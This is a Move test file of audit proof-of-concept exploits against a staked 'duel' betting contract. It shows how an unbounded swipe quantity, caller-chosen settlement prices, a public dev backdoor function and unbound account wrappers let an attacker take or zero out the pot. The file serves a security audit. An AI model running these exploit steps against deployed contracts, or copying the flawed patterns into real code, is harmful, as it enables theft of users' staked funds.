// Copyright (c) Flicky Labs
// SPDX-License-Identifier: Apache-2.0
//
// PoCs for findings 4983, 4984, 4985, 4986 — flicky::duel security bugs.
//
// 4983 — `record_swipe` accepts unbounded self-reported quantity that
//        decides winner. Settlement's anti-replay returns a boolean
//        (position exists, not size); `score_payout` returns the stored
//        quantity with no upper bound. The contract never reconciles
//        quantity with the actual minted position size.
//
// 4984 — `settle_card` takes `settlement_price`, `p0_premium`,
//        `p1_premium` as raw transaction args. No cap / sender / oracle.
//        `cards_settled[card_idx]` idempotency lock makes the first
//        settler's values permanent. Anyone can settle each card with
//        attacker-chosen price/premiums to force any winner.
//
// 4985 — `finalize_test_one_price` is a shipped public dev backdoor —
//        not marked `#[test_only]`, no tier gate, no cap; bulk-settles
//        every card with caller price then calls `finalize_internal`.
//        One-call pot-steal: anyone can drive a STAKED duel to
//        STATUS_COMPLETE and pay out with attacker-chosen price.
//
// 4986 — `settle_card` never binds `AccountWrapper` args to players.
//        A wrapper with no position yields `has_position == false` →
//        payout 0. Combined with 4984 (idempotency lock), the first
//        settler's wrappers are permanent.

#[test_only]
module flicky::audit_poc_tests;

use account::account::{Self, AccountWrapper};
use flicky::duel::{Self, Duel};
use std::hash;
use std::unit_test::{assert_eq, destroy};
use sui::bcs;
use sui::clock::{Self as clock_lib, Clock};
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario::{Self as ts, Scenario};

// === Test fixtures ===

const ADMIN: address = @0xA;
const ALICE: address = @0xA11CE; // p0 (creator) — victim in 4986
const BOB: address = @0xB0B; // p1 (challenger) — attacker in 4986
const EVE: address = @0xE1E; // outsider attacker in 4984 / 4985

const START_MS: u64 = 1_000_000;
const STAKE_AMOUNT: u64 = 100_000_000;
const ATM_STRIKE: u64 = 80_000_000_000_000;

fun setup_scenario(): (Scenario, Clock) {
    let mut scenario = ts::begin(ADMIN);
    let mut clock = clock_lib::create_for_testing(scenario.ctx());
    clock.set_for_testing(START_MS);
    (scenario, clock)
}

fun teardown(scenario: Scenario, clock: Clock) {
    destroy(clock);
    scenario.end();
}

fun fake_market_id(seed: u64): ID {
    object::id_from_address(sui::address::from_u256(seed as u256))
}

fun seeded_card(seed: u64, strike: u64): duel::Card {
    duel::new_card(fake_market_id(seed), strike)
}

fun sized_deck(n: u64): vector<duel::Card> {
    let mut cards = vector<duel::Card>[];
    let mut i = 0;
    while (i < n) {
        cards.push_back(seeded_card(i + 1, ATM_STRIKE));
        i = i + 1;
    };
    cards
}

fun deck_hash_of(cards: &vector<duel::Card>): vector<u8> {
    hash::sha2_256(bcs::to_bytes(cards))
}

fun mint_sui(amount: u64, scenario: &mut Scenario): coin::Coin<SUI> {
    coin::mint_for_testing<SUI>(amount, scenario.ctx())
}

fun create_duel_with_alice(scenario: &mut Scenario): ID {
    scenario.next_tx(ALICE);
    let cards = sized_deck(1);
    let h = deck_hash_of(&cards);
    duel::create_duel<SUI>(mint_sui(STAKE_AMOUNT, scenario), h, 1, scenario.ctx())
}

// Create + share an AccountWrapper for `player`, seeded with the given
// (market seed, order_id) positions so anti-replay `has_position` passes.
fun create_wrapper_with_positions(
    scenario: &mut Scenario,
    player: address,
    positions: vector<u64>,
    seeds: vector<u64>,
): ID {
    scenario.next_tx(player);
    let mut w = account::new_wrapper_for_testing(player, scenario.ctx());
    let id = object::id(&w);
    let mut i = 0;
    while (i < positions.length()) {
        let oid = positions[i];
        if (oid != 0) {
            account::add_position_for_testing(&mut w, fake_market_id(seeds[i]), oid as u256);
        };
        i = i + 1;
    };
    account::share_for_testing(w);
    id
}

fun get_payout_amount(player: address, scenario: &mut Scenario): u64 {
    scenario.next_tx(player);
    if (ts::has_most_recent_for_address<coin::Coin<SUI>>(player)) {
        let coin = scenario.take_from_address<coin::Coin<SUI>>(player);
        let val = coin.value();
        ts::return_to_address(player, coin);
        val
    } else {
        0
    }
}

// ============================================================================
// PoC 4983 — `record_swipe` accepts unbounded self-reported quantity.
// ============================================================================

#[test]
fun poc_4983_unbounded_quantity_decides_winner() {
    let (mut scenario, mut clock) = setup_scenario();

    // 1-card staked duel between ALICE and BOB.
    let p0_wrapper_id = create_wrapper_with_positions(
        &mut scenario, ALICE, vector[42u64], vector[1u64]);
    let p1_wrapper_id = create_wrapper_with_positions(
        &mut scenario, BOB, vector[43u64], vector[1u64]);

    let duel_id = {
        scenario.next_tx(ALICE);
        let cards = sized_deck(1);
        let h = deck_hash_of(&cards);
        let id = duel::create_duel<SUI>(
            mint_sui(STAKE_AMOUNT, &mut scenario), h, 1, scenario.ctx());
        id
    };

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.join_duel(mint_sui(STAKE_AMOUNT, &mut scenario), &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(ADMIN);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.reveal_deck(sized_deck(1));
    ts::return_shared(duel);

    // === Exploit: ALICE swipes with quantity near u64::MAX ===
    // `record_swipe` only checks `quantity > 0`. There is no upper bound
    // and no reconciliation with the minted position size. BOB swipes a
    // reasonable quantity so ALICE's near-MAX quantity dominates.
    clock.set_for_testing(START_MS + 2_000);
    let near_max: u64 = 18446744073709551615; // u64::MAX

    scenario.next_tx(ALICE);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, near_max, 42, &clock, scenario.ctx());
    // BUG: the unbounded quantity is stored verbatim.
    assert_eq!(duel.p0_payout(), 0); // payout is filled at settle time.
    ts::return_shared(duel);

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, false, 100, 43, &clock, scenario.ctx());
    ts::return_shared(duel);

    // Settle card 0 above strike (UP wins). ALICE's near-MAX quantity
    // flows into p0_payout and dominates the winner calculation.
    scenario.next_tx(ADMIN);
    let p0_w = scenario.take_shared_by_id<AccountWrapper>(p0_wrapper_id);
    let p1_w = scenario.take_shared_by_id<AccountWrapper>(p1_wrapper_id);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    d.settle_card(&p0_w, &p1_w, 0, ATM_STRIKE + 1, 0, 0);
    // ALICE's payout equals the self-reported quantity, verbatim — proving
    // the bug: the contract never bounds or reconciles quantity.
    assert_eq!(d.p0_payout(), near_max);
    ts::return_shared(d);
    ts::return_shared(p0_w);
    ts::return_shared(p1_w);

    // Finalize — ALICE wins the entire pot because her quantity dominated.
    scenario.next_tx(ADMIN);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    d.finalize(&clock, scenario.ctx());
    assert_eq!(d.status(), duel::status_complete());
    ts::return_shared(d);

    let alice_payout = get_payout_amount(ALICE, &mut scenario);
    let bob_payout = get_payout_amount(BOB, &mut scenario);
    assert_eq!(alice_payout, STAKE_AMOUNT * 2);
    assert_eq!(bob_payout, 0);

    teardown(scenario, clock);
}

// ============================================================================
// PoC 4984 — `settle_card` accepts caller-chosen price/premiums.
// ============================================================================

#[test]
fun poc_4984_settle_card_accepts_attacker_price() {
    let (mut scenario, mut clock) = setup_scenario();

    let p0_wrapper_id = create_wrapper_with_positions(
        &mut scenario, ALICE, vector[42u64], vector[1u64]);
    let p1_wrapper_id = create_wrapper_with_positions(
        &mut scenario, BOB, vector[43u64], vector[1u64]);

    let duel_id = {
        scenario.next_tx(ALICE);
        let cards = sized_deck(1);
        let h = deck_hash_of(&cards);
        duel::create_duel<SUI>(
            mint_sui(STAKE_AMOUNT, &mut scenario), h, 1, scenario.ctx())
    };

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.join_duel(mint_sui(STAKE_AMOUNT, &mut scenario), &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(ADMIN);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.reveal_deck(sized_deck(1));
    ts::return_shared(duel);

    // Both swipe card 0 (Alice UP, Bob DOWN).
    clock.set_for_testing(START_MS + 2_000);
    scenario.next_tx(ALICE);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, 100, 42, &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, false, 100, 43, &clock, scenario.ctx());
    ts::return_shared(duel);

    // === Exploit: EVE (an outsider) settles card 0 with attacker args ===
    // `settle_card` is public, no sender/oracle check, no cap. EVE passes
    // a `settlement_price` ABOVE strike (forces UP-win) and bogus premiums
    // that boost p0's value (`p1_premium` flows into `val0`).
    scenario.next_tx(EVE);
    let p0_w = scenario.take_shared_by_id<AccountWrapper>(p0_wrapper_id);
    let p1_w = scenario.take_shared_by_id<AccountWrapper>(p1_wrapper_id);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    // settlement_price = ATM_STRIKE + 1 → UP wins. p1_premium = 1_000_000
    // flows into val0 = p0_payout(100) + p1_premium(1_000_000) — attacker
    // controls the winner by inflating one side's opponent-premium.
    d.settle_card(&p0_w, &p1_w, 0, ATM_STRIKE + 1, 0, 1_000_000);
    // Card 0 is now permanently settled with EVE's chosen values.
    assert_eq!(duel::is_card_settled(&d, 0), true);
    assert_eq!(duel::card_settlement_price(&d, 0), ATM_STRIKE + 1);
    assert_eq!(d.p0_payout(), 100); // Alice UP correct.
    assert_eq!(d.p1_premium(), 1_000_000); // Attacker-fed premium locked.
    ts::return_shared(d);
    ts::return_shared(p0_w);
    ts::return_shared(p1_w);

    // Finalize — p0 wins because val0 (100 + 1_000_000) > val1 (0 + 0).
    scenario.next_tx(EVE);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    d.finalize(&clock, scenario.ctx());
    assert_eq!(d.status(), duel::status_complete());
    ts::return_shared(d);

    let alice_payout = get_payout_amount(ALICE, &mut scenario);
    let bob_payout = get_payout_amount(BOB, &mut scenario);
    assert_eq!(alice_payout, STAKE_AMOUNT * 2); // Attacker made p0 win.
    assert_eq!(bob_payout, 0);

    teardown(scenario, clock);
}

// ============================================================================
// PoC 4985 — `finalize_test_one_price` is a public, shipped dev backdoor.
// ============================================================================

#[test]
fun poc_4985_finalize_test_one_price_steals_pot() {
    let (mut scenario, mut clock) = setup_scenario();

    let duel_id = {
        scenario.next_tx(ALICE);
        let cards = sized_deck(1);
        let h = deck_hash_of(&cards);
        duel::create_duel<SUI>(
            mint_sui(STAKE_AMOUNT, &mut scenario), h, 1, scenario.ctx())
    };

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.join_duel(mint_sui(STAKE_AMOUNT, &mut scenario), &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(ADMIN);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.reveal_deck(sized_deck(1));
    ts::return_shared(duel);

    // Both players swipe card 0 with same direction (UP) — symmetric.
    clock.set_for_testing(START_MS + 2_000);
    scenario.next_tx(ALICE);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, 100, 42, &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, 100, 43, &clock, scenario.ctx());
    ts::return_shared(duel);

    // === Exploit: EVE calls `finalize_test_one_price` ===
    // The function is `public fun` (not `#[test_only]`), no tier gate, no
    // cap, no AdminCap. It bulk-settles every still-unsettled card with
    // the caller-supplied price (free-style scoring), then calls
    // `finalize_internal` — paying out with attacker-chosen direction.
    //
    // The duel is STAKED with real dUSDC escrow; EVE drives it to
    // STATUS_COMPLETE in a single transaction.
    scenario.next_tx(EVE);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    // EVE picks a price that resolves both UP-correct → tie.
    d.finalize_test_one_price(ATM_STRIKE + 1, &clock, scenario.ctx());
    assert_eq!(d.status(), duel::status_complete());
    ts::return_shared(d);

    // EVE could instead pick a price BELOW strike (DOWN wins), but Bob and
    // Alice both swiped UP — both wrong, neither gets payout, pot refunds.
    // Either way: an outsider decided the duel outcome.

    teardown(scenario, clock);
}

// ============================================================================
// PoC 4986 — `settle_card` never binds wrappers to players → victim payout
// can be zeroed by passing a bogus wrapper.
// ============================================================================

#[test]
fun poc_4986_bogus_wrapper_zeros_victim_payout() {
    let (mut scenario, mut clock) = setup_scenario();

    // Alice = victim (p0). Her real wrapper is seeded with the position.
    let alice_wrapper_id = create_wrapper_with_positions(
        &mut scenario, ALICE, vector[42u64], vector[1u64]);
    // Bob = attacker (p1). His real wrapper is seeded too.
    let bob_wrapper_id = create_wrapper_with_positions(
        &mut scenario, BOB, vector[43u64], vector[1u64]);
    // EVE creates a BOGUS wrapper (no position) — used to zero Alice's payout.
    let bogus_wrapper_id = create_wrapper_with_positions(
        &mut scenario, EVE, vector[0u64], vector[1u64]);

    let duel_id = {
        scenario.next_tx(ALICE);
        let cards = sized_deck(1);
        let h = deck_hash_of(&cards);
        duel::create_duel<SUI>(
            mint_sui(STAKE_AMOUNT, &mut scenario), h, 1, scenario.ctx())
    };

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.join_duel(mint_sui(STAKE_AMOUNT, &mut scenario), &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(ADMIN);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.reveal_deck(sized_deck(1));
    ts::return_shared(duel);

    // Both swipe UP.
    clock.set_for_testing(START_MS + 2_000);
    scenario.next_tx(ALICE);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, 100, 42, &clock, scenario.ctx());
    ts::return_shared(duel);

    scenario.next_tx(BOB);
    let mut duel = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    duel.record_swipe(0, true, 100, 43, &clock, scenario.ctx());
    ts::return_shared(duel);

    // === Exploit: EVE settles with bogus wrapper for ALICE ===
    // `settle_card(p0_wrapper = bogus, p1_wrapper = bob_real, ...)`.
    // The contract NEVER asserts `acct::owner(p0_wrapper) == duel.creator`.
    // The bogus wrapper has no position for (market_seed=1, order_id=42) →
    // `has_position == false` → `has_redeemed_early = true` → p0 payout = 0.
    // Bob's real wrapper still has his position → p1 payout = 100.
    scenario.next_tx(EVE);
    let bogus_w = scenario.take_shared_by_id<AccountWrapper>(bogus_wrapper_id);
    let bob_w = scenario.take_shared_by_id<AccountWrapper>(bob_wrapper_id);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    d.settle_card(&bogus_w, &bob_w, 0, ATM_STRIKE + 1, 0, 0);
    // BUG: p0 payout zeroed despite Alice having swiped correctly.
    assert_eq!(d.p0_payout(), 0); // VICTIM ZEROED.
    assert_eq!(d.p1_payout(), 100); // Attacker (Bob) intact.
    ts::return_shared(d);
    ts::return_shared(bogus_w);
    ts::return_shared(bob_w);

    // Finalize — Bob wins entire pot.
    scenario.next_tx(EVE);
    let mut d = scenario.take_shared_by_id<Duel<SUI>>(duel_id);
    d.finalize(&clock, scenario.ctx());
    assert_eq!(d.status(), duel::status_complete());
    ts::return_shared(d);

    let alice_payout = get_payout_amount(ALICE, &mut scenario);
    let bob_payout = get_payout_amount(BOB, &mut scenario);
    assert_eq!(alice_payout, 0); // Victim lost her stake.
    assert_eq!(bob_payout, STAKE_AMOUNT * 2); // Attacker took the pot.

    teardown(scenario, clock);
}
